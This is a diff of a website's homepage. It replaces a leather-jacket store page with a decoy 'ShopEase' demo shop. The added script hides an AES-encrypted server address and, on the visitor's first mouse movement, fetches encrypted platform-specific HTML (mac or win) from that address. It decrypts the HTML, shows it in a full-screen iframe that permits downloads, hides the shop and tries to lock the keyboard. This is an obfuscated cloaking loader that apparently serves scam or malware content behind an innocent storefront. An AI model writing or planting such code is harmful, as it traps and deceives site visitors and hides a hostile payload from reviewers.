@@ -1,324 +1,312 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>JacketDistrict &mdash; Heavyweight Outerwear Foundry & Leather Atelier</title>
-  <meta name="description" content="Master outerwear atelier crafting full-grain Horween horsehide double riders, B-3 shearling aviator jackets, British waxed cotton, and Japanese selvedge denim coats.">
-  <link rel="canonical" href="https://jacketdistrict.com/">
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-OD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <div class="reading-progress-bar" aria-hidden="true"></div>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
   
-  <aside class="jacket-telemetry-bar">
-    <div class="container top-telemetry-flex">
-      <div class="hide-ping-badge"><span class="foundry-ping"></span><span>Horween Tannery Chromexcel &bull; 3.5 oz Full-Grain Horsehide &bull; Solid Brass Raccagni Hardware</span></div>
-      <div><span>Location: 181 Mercer Street, New York, NY 10012</span> &bull; <a href="tel:+18887775845" style="color: var(--copper-cognac-light);">Tel: +1-888-777-5845</a></div>
-    </div>
-  </aside>
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <header class="jacket-foundry-header">
-    <div class="container header-nav-flex">
-      <a href="index.php" class="brand-jacket-link" aria-label="JacketDistrict Home">
-        <div class="brand-rivet-box">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.38 3.46 16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.47a1 1 0 0 0 .99.84H6v10c0 1.1.9 2 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.47a2 2 0 0 0-1.34-2.23z"/></svg>
-        </div>
-        <div class="brand-wordmark-cluster">
-          <span class="brand-title-jacket">JacketDistrict</span>
-          <span class="brand-sub-jacket">Outerwear Foundry</span>
-        </div>
-      </a>
-
-      <ul class="jacket-nav-menu">
-        <li><a href="index.php" class="jacket-nav-link active">Foundry</a></li>
-        <li><a href="about.html" class="jacket-nav-link">Tannery Atelier</a></li>
-        <li><a href="blog.html" class="jacket-nav-link">Outerwear Journal</a></li>
-        <li><a href="#jacket-workbench" class="jacket-nav-link">Jacket Workbench</a></li>
-        <li><a href="contact.html" class="jacket-nav-link">Bespoke Salon</a></li>
-      </ul>
-
-      <div class="header-action-cluster">
-        <button class="btn-theme-foundry">Atelier Light</button>
-        <a href="contact.html" class="btn-jacket btn-copper" style="padding: 0.55rem 1.35rem; font-size: 0.74rem;">Commission Outerwear</a>
-        <button class="mobile-toggle-jacket">&#9776;</button>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-    </div>
-  </header>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <main id="main-content">
-    <!-- Industrial Foundry & Split-Screen Hero -->
-    <section class="hero-foundry-section">
-      <div class="container hero-foundry-grid">
-        <div>
-          <span class="badge-jacket">Heavyweight Grain Architecture</span>
-          <h1 class="hero-foundry-title">Armor for the Elements: <span class="copper-accent">Heirloom Outerwear</span></h1>
-          <p class="hero-foundry-desc">
-            JacketDistrict engineers unyielding outerwear built to survive generations. Hand-cut from 3.5 oz vegetable-retanned Horween horsehide, dense British waxed cotton canvas, and natural Merino shearling with solid antique brass hardware and Kevlar-reinforced saddle stitching.
-          </p>
-          <div style="display: flex; gap: 1rem; flex-wrap: wrap;">
-            <a href="#jacket-workbench" class="btn-jacket btn-copper">Launch Outerwear Configurator &rarr;</a>
-            <a href="about.html" class="btn-jacket btn-outline-copper">Tannery & Heritage Science</a>
-          </div>
-          <div class="hero-spec-band">
-            <div class="spec-cell">
-              <h4>3.5 oz</h4>
-              <p>Full-Grain Horsehide</p>
-            </div>
-            <div class="spec-cell">
-              <h4>7,500 mm</h4>
-              <p>Hydrostatic Head Rating</p>
-            </div>
-            <div class="spec-cell">
-              <h4>50+ Years</h4>
-              <p>Break-In Lifespan</p>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-
-        <div class="jacket-showcase-card">
-          <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-foundry); padding-bottom: 1rem;">
-            <div>
-              <h3 style="font-size: 1.35rem; margin-bottom: 0.25rem;">The Double Rider Archive</h3>
-              <p style="font-size: 0.76rem; font-family: var(--font-mono); color: var(--copper-cognac-light); margin-bottom: 0;">Horween Front-Quarter Tea-Core Horsehide</p>
-            </div>
-            <span class="spec-metric-badge">Tea-Core Patina</span>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
-          
-          <div style="border-radius: var(--radius-sm); overflow: hidden; margin: 1.25rem 0; height: 210px;">
-            <img src="images/hero-leather-jacket.jpg" alt="Artisanal full-grain leather biker jacket hanging against industrial concrete wall" style="width: 100%; height: 100%; object-fit: cover;">
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-
-          <div class="jacket-spec-list">
-            <div class="jacket-spec-item">
-              <div class="spec-title">
-                <h5>Seam Skiving Engineering</h5>
-                <p>Hand-Beveled Dual-Needle Lockstitch</p>
-              </div>
-              <span class="spec-metric-badge">Zero Bulk Flex</span>
-            </div>
-            <div class="jacket-spec-item">
-              <div class="spec-title">
-                <h5>Closure Architecture</h5>
-                <p>#10 Raccagni Antiqued Brass Asymmetrical Zip</p>
-              </div>
-              <span class="spec-metric-badge">Windproof Seal</span>
-            </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- Interactive Outerwear Thermal & Hydrostatic Configurator -->
-    <section id="jacket-workbench" class="section-padding">
-      <div class="container">
-        <div class="section-header-jacket">
-          <span class="badge-jacket">Interactive Outerwear Studio</span>
-          <h2>Outerwear Thermal & Hydrostatic Workbench</h2>
-          <p>Select jacket silhouettes, hide weights, and hardware formulations to calculate hydrostatic water repellency, sub-zero thermal ratings, and generational break-in longevity.</p>
-        </div>
-
-        <div class="jacket-workbench-box">
-          <div class="workbench-jacket-grid">
-            <div class="workbench-input-group">
-              <label for="jacket-silhouette-select">Outerwear Silhouette</label>
-              <select id="jacket-silhouette-select" class="jacket-select">
-                <option value="rider">Asymmetrical Double Rider (Biker Leather)</option>
-                <option value="b3">B-3 High-Altitude Aviation Bomber (Merino Shearling)</option>
-                <option value="field">Scottish Waxed Cotton Field Jacket (Four-Pocket)</option>
-                <option value="parka">Ventile L24 Military Storm Parka</option>
-              </select>
-            </div>
-            <div class="workbench-input-group">
-              <label for="jacket-material-select">Hide & Textile Formulation</label>
-              <select id="jacket-material-select" class="jacket-select">
-                <option value="horsehide">3.5 oz Horween Chromexcel Front-Quarter Horsehide</option>
-                <option value="waxed">10 oz Scottish Halley Stevensons Waxed Cotton Canvas</option>
-                <option value="ventile">100% Long-Staple L24 High-Density Ventile Cotton</option>
-                <option value="denim">16 oz Okayama Japanese Selvedge Loomstate Denim</option>
-              </select>
-            </div>
-            <div class="workbench-input-group">
-              <label for="jacket-hardware-select">Hardware & Fasteners</label>
-              <select id="jacket-hardware-select" class="jacket-select">
-                <option value="brass">Solid Antiqued Cast Brass (#10 Gauge)</option>
-                <option value="raccagni">Matte Gunmetal Italian Raccagni Super R</option>
-                <option value="copper">Hand-Hammered Solid Copper Rivets</option>
-              </select>
-            </div>
-          </div>
-
-          <div class="workbench-readout-strip">
-            <div class="readout-cell-box">
-              <h5>Hydrostatic Head Barrier</h5>
-              <p id="calc-hydro">1,500 mm H2O (Natural Repellent)</p>
-            </div>
-            <div class="readout-cell-box">
-              <h5>Cold Weather Rating</h5>
-              <p id="calc-thermal">-5Â°F to 45Â°F (Sub-Zero)</p>
-            </div>
-            <div class="readout-cell-box">
-              <h5>Generational Lifespan</h5>
-              <p id="calc-longevity">50+ Years (Heirloom Grade)</p>
-            </div>
-          </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
     </section>
 
-    <!-- Outerwear Engineering Pillars (Industrial Blueprint Cards) -->
-    <section class="section-padding" style="background: var(--bg-foundry-surface); border-top: 1px solid var(--border-foundry); border-bottom: 1px solid var(--border-foundry);">
-      <div class="container">
-        <div class="section-header-jacket">
-          <span class="badge-jacket">Foundry Construction Standards</span>
-          <h2>The Three Pillars of Indestructible Outerwear</h2>
-          <p>Uncompromising metallurgy, vegetable tannage, and military-spec tailoring.</p>
-        </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-        <div class="jacket-pillars-grid">
-          <div class="pillar-card-jacket">
-            <div class="pillar-frame-media">
-              <img src="images/feature-horsehide-grain.jpg" alt="Thick Horween front-quarter horsehide grain showing natural oil pull-up" loading="lazy">
-            </div>
-            <div class="pillar-pane-body">
-              <span class="badge-jacket" style="margin-bottom: 0.65rem;">Tensile Density</span>
-              <h3>Front-Quarter Horsehide</h3>
-              <p>Denser and more abrasion-resistant than bovine leather, horsehide grain molds to the wearerâ€™s body shape over decades, developing a storied tea-core patina that reveals warm undertones at high-wear stress points.</p>
-            </div>
-          </div>
 
-          <div class="pillar-card-jacket">
-            <div class="pillar-frame-media">
-              <img src="images/feature-shearling-thermal.jpg" alt="Natural Merino wool shearling fleece lining inside aviation jacket" loading="lazy">
-            </div>
-            <div class="pillar-pane-body">
-              <span class="badge-jacket" style="margin-bottom: 0.65rem;">High-Altitude Thermal</span>
-              <h3>Genuine Merino Shearling</h3>
-              <p>Harvested as a single continuous pelt, genuine sheepskin shearling provides an impenetrable thermal shield tested at unpressurized sub-zero cockpit altitudes without requiring synthetic batting.</p>
-            </div>
-          </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-          <div class="pillar-card-jacket">
-            <div class="pillar-frame-media">
-              <img src="images/feature-waxed-cotton.jpg" alt="Weatherproof waxed cotton jacket with water beads rolling off fabric" loading="lazy">
-            </div>
-            <div class="pillar-pane-body">
-              <span class="badge-jacket" style="margin-bottom: 0.65rem;">Hydrostatic Shield</span>
-              <h3>Scottish Waxed Canvas</h3>
-              <p>Milled in Dundee, Scotland by Halley Stevensons, our 10 oz paraffin-waxed canvas repels torrential downpours while aging gracefully with a marbleized character that can be reproofed indefinitely.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1/c6oSZBXUVJE9t5Ut20g0YQEJr27pxneGal+oblg4yRgD+A9Oa0tJC";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-    <!-- Outerwear Care & Tannery FAQ Accordion -->
-    <section class="section-padding">
-      <div class="container">
-        <div class="section-header-jacket">
-          <span class="badge-jacket">Atelier Wisdom</span>
-          <h2>Frequently Addressed Outerwear Inquiries</h2>
-          <p>Essential advice regarding horsehide break-in rituals, shearling storage, and canvas reproofing.</p>
-        </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-        <div class="jacket-faq-accordion">
-          <div class="faq-jacket-item active">
-            <button class="faq-jacket-btn">What makes Front-Quarter Horsehide superior to standard cowhide? <span class="faq-toggle-icon">+</span></button>
-            <div class="faq-jacket-content">
-              Front-quarter horsehide possesses a tighter, more uniform collagen fiber structure than bovine leather, giving it exceptional natural water resistance and extreme abrasion resistance. Over time, vegetable-tanned horsehide develops profound anatomical creasing and reveals underlying tea-core undertones unique to each wearer.
-            </div>
-          </div>
-          <div class="faq-jacket-item">
-            <button class="faq-jacket-btn">How should a heavyweight 3.5 oz leather jacket be broken in? <span class="faq-toggle-icon">+</span></button>
-            <div class="faq-jacket-content">
-              Heavyweight leather jackets should be broken in naturally through regular wear. Body heat and joint movement soften the oils infused during Horweenâ€™s Chromexcel tanning process, gradually molding the leather to your torso like custom armor. Avoid artificial heat or excessive immersion in water.
-            </div>
-          </div>
-          <div class="faq-jacket-item">
-            <button class="faq-jacket-btn">How often should Scottish waxed cotton jackets be reproofed? <span class="faq-toggle-icon">+</span></button>
-            <div class="faq-jacket-content">
-              Depending on rainfall exposure and daily wear, waxed cotton outerwear should be reproofed with authentic paraffin dressing once every 12 to 18 months. Gently heating the wax with a hairdryer allows the compound to melt deep into the cotton twill weave, restoring full hydrostatic stormproof performance.
-            </div>
-          </div>
-          <div class="faq-jacket-item">
-            <button class="faq-jacket-btn">How should I store and maintain a genuine B-3 shearling jacket? <span class="faq-toggle-icon">+</span></button>
-            <div class="faq-jacket-content">
-              Store shearling coats on wide, contoured wooden hangers in a cool, well-ventilated closet away from radiators and direct sunlight. Never seal shearling inside non-breathable plastic bags; use 100% natural cotton garment covers that allow the leather and wool fibers to breathe naturally.
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-  </main>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-  <footer class="jacket-footer">
-    <div class="container">
-      <div class="footer-grid-jacket">
-        <div class="footer-brand-cell">
-          <div style="display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem;">
-            <div class="brand-rivet-box" style="width: 38px; height: 38px;">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.38 3.46 16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.47a1 1 0 0 0 .99.84H6v10c0 1.1.9 2 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.47a2 2 0 0 0-1.34-2.23z"/></svg>
-            </div>
-            <span style="font-family: var(--font-display); font-size: 1.45rem; color: #ffffff; letter-spacing: 0.02em; font-weight: 800;">JacketDistrict</span>
-          </div>
-          <p>Heavyweight Outerwear Foundry & Leather Atelier dedicated to the preservation of full-grain horsehide, Scottish waxed canvas, and heirloom aviator shearling.</p>
-        </div>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-        <div class="footer-col-jacket">
-          <h4>Foundry Modules</h4>
-          <ul>
-            <li><a href="index.php">Foundry Home</a></li>
-            <li><a href="about.html">Tannery Atelier</a></li>
-            <li><a href="blog.html">Outerwear Journal</a></li>
-            <li><a href="index.php#jacket-workbench">Jacket Workbench</a></li>
-            <li><a href="contact.html">Bespoke Salon</a></li>
-          </ul>
-        </div>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-        <div class="footer-col-jacket">
-          <h4>Legal & Ethics</h4>
-          <ul>
-            <li><a href="privacy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms of Service</a></li>
-            <li><a href="disclaimer.html">Atelier Disclaimer</a></li>
-            <li><a href="cookies.html">Cookie Preferences</a></li>
-          </ul>
-        </div>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-        <div class="footer-col-jacket">
-          <h4>Atelier Salon</h4>
-          <p style="font-size: 0.88rem; line-height: 1.7; color: #8b99ad;">
-            <strong>Maison Flagship:</strong><br>
-            181 Mercer Street,<br>
-            New York, NY 10012,<br>
-            United States
-          </p>
-          <p style="margin-top: 0.85rem; font-size: 0.88rem;">
-            <strong>Concierge Desk:</strong><br>
-            <a href="tel:+18887775845" style="color: var(--copper-cognac-light);">+1-888-777-5845</a>
-          </p>
-        </div>
-      </div>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-      <div class="footer-strip-jacket">
-        <div>&copy; <?php echo date('Y'); ?> JacketDistrict Outerwear Foundry. All rights reserved. Full-Grain & Waxed Craft.</div>
-        <div class="footer-strip-links">
-          <a href="privacy.html">Privacy</a>
-          <a href="terms.html">Terms</a>
-          <a href="disclaimer.html">Disclaimer</a>
-          <a href="cookies.html">Cookies</a>
-        </div>
-      </div>
-    </div>
-  </footer>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-  <script src="script.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
